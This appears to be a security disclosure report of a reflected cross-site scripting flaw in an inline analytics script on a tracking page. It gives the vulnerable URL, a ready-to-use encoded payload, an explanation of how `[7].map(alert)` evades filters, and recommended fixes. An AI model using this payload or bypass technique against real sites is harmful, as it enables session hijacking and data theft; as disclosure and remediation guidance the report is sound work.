## Title
Reflected Cross-Site Scripting (XSS) - JavaScript Context Injection in Analytics Block

## Vulnerability Type
Reflected XSS (JavaScript Context Injection)

## Summary
The tracking page on `https://kzlabs.in/subdomains/tracking/` reflects the `search` query parameter directly into an inline `<script>` block without proper sanitization or JavaScript-context encoding. Unlike all previous findings in this batch (which were HTML-context reflections), this vulnerability occurs inside an existing JavaScript variable assignment - specifically, the value of `internalSearchTerm` inside an `Analytics.trackEvent()` call. By closing the open string literal (`"`) and injecting a valid JavaScript expression (`[7].map(alert)`), the attacker executes arbitrary JavaScript entirely within the existing script block, bypassing any HTML-tag-based filters entirely since no new HTML tags are introduced.

## Vulnerable Endpoint
`https://kzlabs.in/subdomains/tracking/?search=`

## Steps to Reproduce
1. Navigate to the following URL and observe the search bar:
   `https://kzlabs.in/subdomains/tracking/?search=%22+%2C+internalSearchTerm%3A+%5B7%5D.map%28alert%29+%2C+numOfSearchResultsReturned%3A+%22b#`
2. Observe that a JavaScript alert box pops up - confirming the injected payload broke out of the `internalSearchTerm` string literal inside the inline `<script>` block and executed as valid JavaScript.

### Why This Payload Works
The page reflects the `search` value unsanitized inside an existing `<script>` block:
```javascript
Analytics.trackEvent('searchReturned', {
    internalSearchTerm: "REFLECTED_HERE",
    numOfSearchResultsReturned: 5
});
```
The injected value closes the open string and injects a second `internalSearchTerm` key with `[7].map(alert)` as its value:
```javascript
Analytics.trackEvent('searchReturned', {
    internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b",
    numOfSearchResultsReturned: 5
});
```
`[7].map(alert)` invokes `alert` as a callback function reference rather than a direct call (`alert(...)`), bypassing filters that pattern-match the literal string `alert(`.

## Payload Used
```
" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b
```
URL-encoded:
```
%22+%2C+internalSearchTerm%3A+%5B7%5D.map%28alert%29+%2C+numOfSearchResultsReturned%3A+%22b
```

## Affected Code (Page Source)
```javascript
<script type="text/javascript">
    var Analytics = {
        trackEvent: function(eventName, params) {
            console.log('[Analytics]', eventName, params);
        }
    };
    window.onload = function(e) {
        Analytics.trackEvent('searchReturned', {
            internalSearchTerm: "" , internalSearchTerm: [7].map(alert) , numOfSearchResultsReturned: "b",
            numOfSearchResultsReturned: 5
        });
    }
</script>
```

## Proof of Concept Request
<img width="1917" height="1041" alt="Screenshot 2026-09-08 072121" src="https://github.com/user-attachments/assets/f8451669-2d12-438f-8893-1e7d7bc7f1a4" />
<img width="1917" height="1032" alt="Screenshot 2026-09-08 072111" src="https://github.com/user-attachments/assets/6f08ec9d-1658-4da9-b4ee-d70b2941f13d" />


## Impact
This vulnerability allows an attacker to hijack sessions, perform unauthorized actions on behalf of the victim, redirect users to phishing pages, or exfiltrate sensitive data - all by getting a victim to click a single crafted link. This finding is notably distinct from the other XSS findings in this batch: it occurs inside an existing JavaScript execution context rather than HTML context, meaning HTML-tag-based WAF rules and tag/attribute filters are completely ineffective against it. The use of `[7].map(alert)` instead of `alert()` further demonstrates the ability to bypass function-call pattern-matching filters. A real attacker would substitute `alert` with any arbitrary function - including data-exfiltration code targeting `document.cookie` or `localStorage`.

## Recommendations for Fix
Apply JavaScript-specific output encoding (not just HTML encoding) when reflecting user input inside a `<script>` block. For PHP, `htmlspecialchars()` is insufficient here since the reflection point is inside an existing JavaScript string context - instead, use a dedicated JavaScript encoder (e.g. `json_encode()` in PHP, which produces a properly escaped JavaScript string literal including quote escaping). The fix should produce:
```javascript
internalSearchTerm: <?php echo json_encode($search); ?>,
```
Add a strict Content-Security-Policy header (avoiding `unsafe-inline`) as defense-in-depth, which would block inline script execution entirely. Any HTML-tag-based WAF rules currently in place provide no protection against this class of injection.
